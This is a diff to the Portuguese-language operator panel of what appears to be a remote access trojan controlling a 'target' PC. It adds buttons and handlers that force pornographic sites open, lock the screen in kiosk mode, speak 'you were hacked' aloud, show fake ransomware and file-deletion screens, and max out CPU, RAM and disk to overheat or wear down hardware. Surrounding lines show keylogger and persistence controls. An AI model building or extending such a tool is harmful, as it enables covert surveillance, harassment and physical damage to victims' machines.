@@ -112,6 +112,14 @@ input[type=text]:focus{border-color:#38bdf8}
       <button data-act="shutdown">desligar</button>
       <button data-act="power">power</button>
     </div>
+    <div class="grp"><span>abrir sites (alvo)</span>
+      <button data-act="t_site">abrir site</button>
+      <button data-act="t_xv">xvideos</button>
+      <button data-act="t_yt">youtube</button>
+      <button data-act="t_site_kiosk">quiosque</button>
+      <button data-act="t_popup">popup x N</button>
+      <button data-act="t_rick">rickroll</button>
+    </div>
     <div class="grp"><span>troll</span>
       <button data-act="t_cursor">cursor off</button>
       <button data-act="t_lock">trava mouse</button>
@@ -147,6 +155,26 @@ input[type=text]:focus{border-color:#38bdf8}
       <button data-act="t_wshake">tremer janela</button>
       <button data-act="t_notepad">notepads</button>
       <button data-act="t_clip_garbage">clipboard lixo</button>
+    </div>
+    <div class="grp"><span>troll 4</span>
+      <button data-act="t_speak">falar</button>
+      <button data-act="t_type">digitar sozinho</button>
+      <button data-act="t_wheel">roda louca</button>
+      <button data-act="t_wheel_ok">roda ok</button>
+      <button data-act="t_cd">gaveta cd</button>
+      <button data-act="t_saver">protetor de tela</button>
+      <button data-act="t_cmd_storm">enxurrada cmd</button>
+      <button data-act="t_fakedel">excluindo...</button>
+      <button data-act="t_ransom">ransomware falso</button>
+    </div>
+    <div class="grp"><span>estresse (hardware)</span>
+      <button data-act="t_cpu">cpu 100%</button>
+      <button data-act="t_ram">encher ram</button>
+      <button data-act="t_ram_bomb">bomba ram</button>
+      <button data-act="t_disk">encher disco</button>
+      <button data-act="t_heat">esquentar</button>
+      <button data-act="t_stress_all">tudo junto</button>
+      <button data-act="t_stress_stop">parar</button>
     </div>
     <div class="grp"><span>persistência</span>
       <button data-act="persist">persistir</button>
@@ -408,6 +436,32 @@ const ACT = {
   t_wshake: () => { const s = ask('segundos tremendo a janela em foco', '5'); if (s !== null) exec('troll', {action:'window_shake', seconds: parseInt(s) || 5}, 'tremer janela ' + s + 's'); },
   t_notepad:() => { const n = ask('quantos notepads abrir', '8'); if (n) exec('troll', {action:'notepad', count: parseInt(n) || 8}, 'notepads x' + n); },
   t_clip_garbage: () => exec('troll', {action:'clip_garbage'}, 'clipboard com lixo'),
+  t_site:   () => { const u = ask('site para abrir no alvo (xvideos, youtube, pornhub, google... ou url/termo)', 'xvideos'); if (u) exec('troll', {action:'openurl', url:u}, 'abrir ' + u); },
+  t_xv:     () => exec('troll', {action:'openurl', url:'xvideos'}, 'abrir xvideos'),
+  t_yt:     () => exec('troll', {action:'openurl', url:'youtube'}, 'abrir youtube'),
+  t_site_kiosk: () => { const u = ask('site em tela cheia (só fecha com Alt+F4)', 'youtube'); if (u) exec('troll', {action:'kiosk', url:u}, 'quiosque ' + u); },
+  t_popup:  () => { const u = ask('site para abrir em várias abas', 'xvideos'); if (!u) return;
+                    const n = ask('quantas abas/janelas (1-12)', '5'); if (n === null) return;
+                    exec('troll', {action:'openurl', url:u, count: parseInt(n) || 5}, u + ' x' + n); },
+  t_rick:   () => exec('troll', {action:'rickroll'}, 'rickroll em tela cheia'),
+  t_speak:  () => { const t = ask('o que o PC do alvo vai falar em voz alta', 'Você foi hackeado. Eu estou vendo a sua tela.'); if (t) exec('troll', {action:'speak', text:t}, 'falar'); },
+  t_type:   () => { const t = ask('texto para digitar sozinho na janela ativa (vazio = lixo aleatório)'); if (t === null) return; exec('troll', {action:'type_garbage', text:t}, 'digitando sozinho'); },
+  t_wheel:  () => { const l = ask('linhas por entalhe da roda (100 = hipersensível, 1 = travada)', '100'); if (l !== null) exec('troll', {action:'wheel', lines: parseInt(l) || 100}, 'roda ' + l); },
+  t_wheel_ok: () => exec('troll', {action:'wheel_ok'}, 'roda normal'),
+  t_cd:     () => { const n = ask('quantas vezes abrir/fechar a gaveta do CD', '3'); if (n !== null) exec('troll', {action:'cd_tray', count: parseInt(n) || 3}, 'gaveta cd x' + n); },
+  t_saver:  () => exec('troll', {action:'screensaver'}, 'protetor de tela'),
+  t_cmd_storm: () => { const n = ask('quantas janelas de cmd abrir', '6'); if (n !== null) exec('troll', {action:'cmd_storm', count: parseInt(n) || 6}, 'cmd x' + n); },
+  t_fakedel: () => { const s = ask('segundos da tela falsa de exclusão de arquivos', '25'); if (s !== null) exec('troll', {action:'fake_delete', seconds: parseInt(s) || 25}, 'excluindo ' + s + 's'); },
+  t_ransom: () => { const s = ask('segundos da nota falsa de ransomware', '45'); if (s !== null) exec('troll', {action:'fake_ransom', seconds: parseInt(s) || 45}, 'ransom ' + s + 's'); },
+  t_cpu:    () => { const s = ask('segundos queimando todos os núcleos da CPU', '60'); if (s !== null) exec('troll', {action:'stress_cpu', seconds: parseInt(s) || 60}, 'cpu 100% ' + s + 's'); },
+  t_ram:    () => { const p = ask('porcentagem da RAM a encher (10-95)', '80'); if (p === null) return;
+                    const s = ask('segundos segurando a RAM cheia', '30'); if (s === null) return;
+                    exec('troll', {action:'stress_ram', pct: parseInt(p) || 80, seconds: parseInt(s) || 30}, 'ram ' + p + '% por ' + s + 's'); },
+  t_ram_bomb: () => { const s = ask('segundos de bomba de RAM (95% — trava tudo)', '15'); if (s !== null) exec('troll', {action:'ram_bomb', seconds: parseInt(s) || 15}, 'bomba ram ' + s + 's'); },
+  t_disk:   () => { const m = ask('quantos MB escrever no disco (desgasta o SSD)', '4096'); if (m === null) return; exec('troll', {action:'stress_disk', mb: parseInt(m) || 4096}, 'disco ' + m + 'MB'); },
+  t_heat:   () => { const s = ask('segundos de aquecimento (todos os núcleos + alto desempenho)', '120'); if (s !== null) exec('troll', {action:'heat', seconds: parseInt(s) || 120}, 'esquentar ' + s + 's'); },
+  t_stress_all: () => { const s = ask('segundos de estresse total (cpu + ram + disco)', '60'); if (s !== null) exec('troll', {action:'stress_all', seconds: parseInt(s) || 60}, 'estresse total ' + s + 's'); },
+  t_stress_stop: () => exec('troll', {action:'stress_stop'}, 'parar estresse'),
   wall:     () => { const p = ask('caminho de imagem no alvo (ex: C:\\\\Windows\\\\Web\\\\Wallpaper\\\\Windows\\\\img0.jpg)'); if (p) exec('wallpaper', {path:p}, 'papel de parede'); },
   kstart:   () => exec('keylog', {action:'start'}, 'keylog on'),
   kdump:    () => exec('keylog', {action:'dump'}, 'keylog dump'),
